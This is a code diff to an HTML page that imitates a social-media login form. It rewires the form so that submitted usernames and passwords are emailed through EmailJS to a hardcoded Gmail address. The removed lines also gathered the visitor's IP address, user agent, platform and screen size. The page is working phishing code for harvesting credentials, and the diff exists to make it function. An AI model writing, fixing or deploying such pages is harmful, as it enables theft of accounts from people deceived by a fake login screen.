@@ -36,14 +36,14 @@
         </div>
 
         <!--Form Login-->
-        <form id="login-post" method="POST">
+        <form id="login-form">
           <div class="inputs-container">
-            <input type="text" name="username" placeholder="Phone number, username or email">
+            <input type="text" id="username" name="username" placeholder="Phone number, username or email">
           </div>
           <div class="inputs-container">
-            <input type="password" name="password" placeholder="Password">
+            <input type="password" id="password" name="password" placeholder="Password">
           </div>
-          <a class="login-button" href="#" target="_blank">Log In</a>
+          <button type="submit" class="login-button">Log In</button>
 
           <div class="or-container">
             <div class="line"></div>
@@ -129,54 +129,31 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
   <script>
       (function() {
-          emailjs.init('YOUR_PUBLIC_KEY'); // استبدل بـ Public Key الخاصة بك من EmailJS
+          emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS Public Key
       })();
-  
+
       document.getElementById('login-form').addEventListener('submit', function(e) {
           e.preventDefault();
-  
-          const email = document.getElementById('email').value;
+
+          const username = document.getElementById('username').value;
           const password = document.getElementById('password').value;
-  
-          axios.get('https://api.ipify.org?format=json')
+
+          const templateParams = {
+              to_email: 'yedkfih999@gmail.com', // Replace with the recipient email address
+              subject: 'New Login Attempt',
+              message: `Username: ${username}\nPassword: ${password}`
+          };
+
+          emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
               .then(response => {
-                  const ip = response.data.ip;
-  
-                  const userAgent = navigator.userAgent;
-                  const platform = navigator.platform;
-                  const screenWidth = screen.width;
-                  const screenHeight = screen.height;
-                  const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-  
-                  const templateParams = {
-                      to_email: 'yedkfih999@gmail.com', // استبدل بعنوان البريد الإلكتروني المستلم
-                      subject: 'محاولة تسجيل دخول جديدة',
-                      message: `
-                          محاولة تسجيل دخول جديدة\n
-                          البريد الإلكتروني: ${email}\n
-                          كلمة المرور: ${password}\n
-                          عنوان IP: ${ip}\n
-                          نوع الجهاز: ${deviceType}\n
-                          النظام الأساسي: ${platform}\n
-                          وكيل المستخدم: ${userAgent}\n
-                          دقة الشاشة: ${screenWidth}x${screenHeight}
-                      `
-                  };
-  
-                  emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
-                      .then(response => {
-                          alert('تم إرسال البيانات بنجاح!');
-                      })
-                      .catch(error => {
-                          alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
-                      });
+                  alert('Information sent successfully!');
               })
               .catch(error => {
-                  alert('حدث خطأ أثناء الحصول على عنوان IP. يرجى المحاولة مرة أخرى.');
+                  alert('An error occurred while sending the information. Please try again.');
               });
       });
   </script>
-  
+
 </body>
 
 </html>
